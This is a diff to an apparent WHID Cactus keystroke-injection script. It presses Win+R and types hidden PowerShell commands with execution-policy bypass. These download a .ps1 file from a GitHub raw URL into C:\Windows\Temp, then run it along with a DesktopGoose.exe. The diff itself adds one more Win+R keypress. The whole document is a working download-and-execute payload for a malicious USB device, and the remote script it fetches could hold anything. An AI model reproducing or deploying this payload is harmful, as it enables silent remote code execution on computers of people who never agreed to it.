@@ -1,3 +1,4 @@
 Press:131+114
 PrintLine:powershell -nop -noni -w 1 -Exec Bypass "(New-Object -TypeName System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Starke427/WHID_Cactus/master/d7893c3e.ps1', 'C:\Windows\Temp\d7893c3e.ps1')"
+Press:131+114
 PrintLine:powershell -nop -noni -w 1 "& 'C:\Windows\Temp\d7893c3e.ps1'; & 'C:\Windows\Temp\tw-9dc-75c-5c965a3.tmp\DesktopGoose.exe'"
